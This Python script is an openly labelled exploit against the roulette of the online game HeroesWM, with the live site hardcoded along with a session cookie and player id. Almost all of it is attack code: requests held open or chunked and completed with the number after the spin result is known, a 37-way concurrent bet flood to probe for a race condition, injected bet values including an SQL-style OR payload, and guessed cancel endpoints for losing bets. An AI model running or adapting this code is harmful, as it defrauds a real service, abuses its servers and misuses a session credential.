#!/usr/bin/env python3
"""
HeroesWM Roulette Aggressive Exploit

Multiple attack vectors:
1. HTTP request smuggling (hold connection open, complete after result)
2. Concurrent flood (37 bets for all numbers at spin time)
3. bettype injection
4. Bet cancellation after result
"""
import urllib.request
import urllib.parse
import http.client
import socket
import ssl
import time
import re
import sys
import threading
from concurrent.futures import ThreadPoolExecutor

COOKIE = "PHPSESSID=8356c909f3f0a190aeeba8040c0c637f; pl_id=8777586"
BASE_HOST = "www.heroeswm.ru"
BASE = f"https://{BASE_HOST}/"

def fetch(url, data=None, timeout=5):
    if data:
        if isinstance(data, dict):
            encoded = urllib.parse.urlencode(data).encode()
        else:
            encoded = data.encode() if isinstance(data, str) else data
        req = urllib.request.Request(url, data=encoded)
    else:
        req = urllib.request.Request(url)
    req.add_header("Cookie", COOKIE)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.read().decode("windows-1251", errors="replace")
    except Exception as e:
        return f"ERROR: {e}"

def get_roulette_info():
    html = fetch(BASE + "roulette.php")
    m = re.search(r"parlay_dec.*?value='(\d+)'", html)
    game_id = m.group(1) if m else None
    m2 = re.search(r"H = (\d+); var M = (\d+); var S = (\d+)", html)
    if m2:
        h, mi, s = int(m2.group(1)), int(m2.group(2)), int(m2.group(3))
        total_sec = h * 3600 + mi * 60 + s
        next_spin = ((total_sec // 300) + 1) * 300
        wait = next_spin - total_sec
        return game_id, wait, total_sec
    return game_id, 999, 0

def check_result(game_id):
    html = fetch(f"{BASE}inforoul.php?id={game_id}", timeout=3)
    m = re.search(r"Выпало число.*?<b>(\d+)", html, re.DOTALL)
    if m:
        return int(m.group(1))
    return None

def get_gold():
    html = fetch(BASE + "roulette.php", timeout=3)
    m = re.search(r'data-hwm-topline-resource-amount="gold">\s*([^<]+)', html)
    if m:
        return int(m.group(1).replace(",", "").strip())
    return -1

def get_gold_from_html(html):
    m = re.search(r'data-hwm-topline-resource-amount="gold">\s*([^<]+)', html)
    if m:
        return int(m.group(1).replace(",", "").strip())
    return -1

# ============================================
# ATTACK 1: HTTP Request Smuggling
# Open TCP connection, send partial POST body,
# wait for result, then complete with correct number
# ============================================
def attack_smuggling(game_id):
    print("\n=== ATTACK 1: HTTP Request Smuggling ===")
    print(f"Game: {game_id}")
    
    # Create SSL connection
    ctx = ssl.create_default_context()
    sock = socket.create_connection((BASE_HOST, 443), timeout=30)
    ssock = ctx.wrap_socket(sock, server_hostname=BASE_HOST)
    
    # Send POST headers + partial body (everything except bettype value)
    partial_body = f"parlay_dec={game_id}&minutes=4&seconds=59&bet=100&bettype="
    
    request = (
        f"POST /parlay.php HTTP/1.1\r\n"
        f"Host: {BASE_HOST}\r\n"
        f"Cookie: {COOKIE}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(partial_body) + 20}\r\n"  # leave room for bettype
        f"Connection: keep-alive\r\n"
        f"\r\n"
        f"{partial_body}"
    )
    
    print(f"Sending partial request (waiting for result)...")
    ssock.sendall(request.encode())
    
    # Now poll for result on a SEPARATE connection
    result = None
    start = time.time()
    while result is None and (time.time() - start) < 20:
        result = check_result(game_id)
        if result is None:
            time.sleep(0.3)
    
    if result is None:
        print("Timeout - no result found")
        ssock.close()
        return None
    
    print(f"Result found: {result}! Completing request with 'Straight up {result}'...")
    
    # Complete the request body
    completion = f"Straight+up+{result}"
    try:
        ssock.sendall(completion.encode())
        
        # Read response
        response = b""
        while True:
            try:
                data = ssock.recv(4096)
                if not data:
                    break
                response += data
            except:
                break
        
        ssock.close()
        resp_text = response.decode("windows-1251", errors="replace")
        gold = get_gold_from_html(resp_text)
        print(f"Response gold: {gold}")
        return result
    except Exception as e:
        print(f"Error completing request: {e}")
        ssock.close()
        return result

# ============================================
# ATTACK 2: Concurrent Flood (37 bets at once)
# Send bets for ALL 37 numbers simultaneously
# Cost: 37 * 100 = 3,700 gold
# Win: 3,500 gold (35:1 on 100)
# Net: -200 gold (BUT: if server has race condition,
# maybe only the winning bet gets accepted)
# ============================================
def attack_flood(game_id):
    print("\n=== ATTACK 2: Concurrent Flood (37 bets) ===")
    print(f"Game: {game_id}")
    
    gold_before = get_gold()
    print(f"Gold before: {gold_before}")
    
    def place_bet(num):
        data = {
            "parlay_dec": str(game_id),
            "minutes": "4",
            "seconds": "59",
            "bet": "100",
            "bettype": f"Straight up {num}",
            "cur_pl_bet": "0",
        }
        html = fetch(BASE + "parlay.php", data, timeout=5)
        return num, get_gold_from_html(html)
    
    # Send all 37 bets concurrently
    with ThreadPoolExecutor(max_workers=37) as executor:
        results = list(executor.map(place_bet, range(37)))
    
    # Check how many were accepted
    gold_after = get_gold()
    total_spent = gold_before - gold_after
    accepted = total_spent // 100
    
    print(f"Gold after: {gold_after}")
    print(f"Total spent: {total_spent}")
    print(f"Bets accepted: {accepted}")
    
    return gold_after

# ============================================
# ATTACK 3: bettype injection
# Try sending manipulated bettype values
# ============================================
def attack_injection(game_id):
    print("\n=== ATTACK 3: bettype Injection ===")
    print(f"Game: {game_id}")
    
    injections = [
        # Try to bet on multiple numbers at once
        "Straight up 0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36",
        # Try OR injection
        "Straight up 0' OR '1'='1",
        # Try array injection
        "Straight up 0[]",
        # Try JSON
        '{"number": 29}',
        # Try wildcard
        "Straight up *",
        # Try empty (maybe server defaults to all?)
        "",
        # Try "Any" 
        "Any",
    ]
    
    gold_before = get_gold()
    
    for inj in injections:
        data = {
            "parlay_dec": str(game_id),
            "minutes": "4",
            "seconds": "59",
            "bet": "100",
            "bettype": inj,
            "cur_pl_bet": "0",
        }
        html = fetch(BASE + "parlay.php", data, timeout=5)
        gold_after = get_gold_from_html(html)
        accepted = gold_after < gold_before
        if accepted:
            gold_before = gold_after
            print(f"  ACCEPTED: '{inj[:50]}' → gold={gold_after}")
        # Don't print rejected ones to keep output clean
    
    gold_final = get_gold()
    print(f"Gold: {gold_before} → {gold_final}")
    return gold_final

# ============================================
# ATTACK 4: Chunked Transfer Encoding
# Send request with chunked encoding, delay the final chunk
# ============================================
def attack_chunked(game_id):
    print("\n=== ATTACK 4: Chunked Transfer Encoding ===")
    print(f"Game: {game_id}")
    
    ctx = ssl.create_default_context()
    sock = socket.create_connection((BASE_HOST, 443), timeout=30)
    ssock = ctx.wrap_socket(sock, server_hostname=BASE_HOST)
    
    # Send with chunked encoding
    body_part1 = f"parlay_dec={game_id}&minutes=4&seconds=59&bet=100&bettype="
    
    request = (
        f"POST /parlay.php HTTP/1.1\r\n"
        f"Host: {BASE_HOST}\r\n"
        f"Cookie: {COOKIE}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
    )
    
    ssock.sendall(request.encode())
    
    # Send first chunk (without bettype)
    chunk1 = f"{len(body_part1):x}\r\n{body_part1}\r\n"
    ssock.sendall(chunk1.encode())
    print("Sent first chunk, waiting for result...")
    
    # Poll for result
    result = None
    start = time.time()
    while result is None and (time.time() - start) < 20:
        result = check_result(game_id)
        if result is None:
            time.sleep(0.3)
    
    if result is None:
        print("Timeout")
        ssock.close()
        return None
    
    print(f"Result: {result}! Sending final chunk...")
    
    # Send final chunk with the winning number
    body_part2 = f"Straight+up+{result}"
    chunk2 = f"{len(body_part2):x}\r\n{body_part2}\r\n"
    ssock.sendall(chunk2.encode())
    
    # Send terminating chunk
    ssock.sendall(b"0\r\n\r\n")
    
    # Read response
    response = b""
    try:
        while True:
            data = ssock.recv(4096)
            if not data:
                break
            response += data
    except:
        pass
    
    ssock.close()
    resp_text = response.decode("windows-1251", errors="replace")
    gold = get_gold_from_html(resp_text)
    print(f"Response gold: {gold}")
    return result

# ============================================
# ATTACK 5: Bet cancellation
# Place bet before spin, try to cancel after seeing result
# ============================================
def attack_cancel(game_id):
    print("\n=== ATTACK 5: Bet Cancellation ===")
    print(f"Game: {game_id}")
    
    # Place a bet on RED first
    gold_before = get_gold()
    data = {
        "parlay_dec": str(game_id),
        "minutes": "4",
        "seconds": "59",
        "bet": "100",
        "bettype": "RED",
        "cur_pl_bet": "0",
    }
    html = fetch(BASE + "parlay.php", data, timeout=5)
    gold_after_bet = get_gold_from_html(html)
    print(f"Bet on RED: gold {gold_before} → {gold_after_bet}")
    
    # Wait for result
    result = None
    start = time.time()
    while result is None and (time.time() - start) < 30:
        result = check_result(game_id)
        if result is None:
            time.sleep(0.5)
    
    if result is None:
        print("Timeout")
        return
    
    reds = {1,3,5,7,9,12,14,16,18,19,21,23,25,27,30,32,34,36}
    is_red = result in reds
    print(f"Result: {result} ({'RED' if is_red else 'BLACK/GREEN'})")
    
    # If we lost, try to cancel the bet
    if not is_red:
        print("We lost! Trying to cancel bet...")
        
        # Try various cancel endpoints
        cancel_urls = [
            f"parlay.php?action=cancel&parlay_dec={game_id}",
            f"parlay.php?action=del&parlay_dec={game_id}",
            f"parlay.php?cancel=1&parlay_dec={game_id}",
            f"roulette.php?action=cancel&parlay_dec={game_id}",
            f"parlay.php?action=remove&parlay_dec={game_id}",
        ]
        
        for url in cancel_urls:
            html = fetch(BASE + url, timeout=5)
            gold_check = get_gold_from_html(html)
            if gold_check > gold_after_bet:
                print(f"  CANCEL WORKED: {url} → gold={gold_check}")
                return
            # Also try POST
            html = fetch(BASE + url.split('?')[0], {"action": "cancel", "parlay_dec": game_id}, timeout=5)
            gold_check = get_gold_from_html(html)
            if gold_check > gold_after_bet:
                print(f"  CANCEL WORKED (POST): {url} → gold={gold_check}")
                return
        
        print("  All cancel attempts failed")
    
    # Final gold check
    time.sleep(3)
    gold_final = get_gold()
    print(f"Final gold: {gold_final}")

# ============================================
# MAIN
# ============================================
print("=" * 60)
print("HeroesWM Roulette Aggressive Exploit")
print("=" * 60)

game_id, wait, _ = get_roulette_info()
print(f"Current game: {game_id}, wait: {wait}s")

# Run attacks that can run before spin
if wait > 30:
    # Attack 3: Injection (can run anytime)
    attack_injection(game_id)
    
    # Get fresh game info (injection might have changed state)
    game_id, wait, _ = get_roulette_info()
    print(f"\nUpdated: game={game_id}, wait={wait}s")

# Wait until close to spin
if wait > 15:
    print(f"\nWaiting {wait-15}s until 15s before spin...")
    time.sleep(wait - 15)

# Refresh game ID
game_id, wait, _ = get_roulette_info()
print(f"\nFinal: game={game_id}, wait={wait}s")

# Attack 1: Smuggling (needs to start right before spin)
print("\n--- Starting smuggling attack ---")
t1 = threading.Thread(target=attack_smuggling, args=(game_id,))
t1.start()

# Wait for result on main thread
result = None
start = time.time()
while result is None and (time.time() - start) < 25:
    result = check_result(game_id)
    if result is None:
        time.sleep(0.3)

if result:
    print(f"\n>>> RESULT: {result} <<<")

t1.join(timeout=10)

# Attack 5: Try cancellation
attack_cancel(game_id)

# Final status
gold_final = get_gold()
print(f"\n{'=' * 60}")
print(f"Final gold: {gold_final}")
print(f"{'=' * 60}")
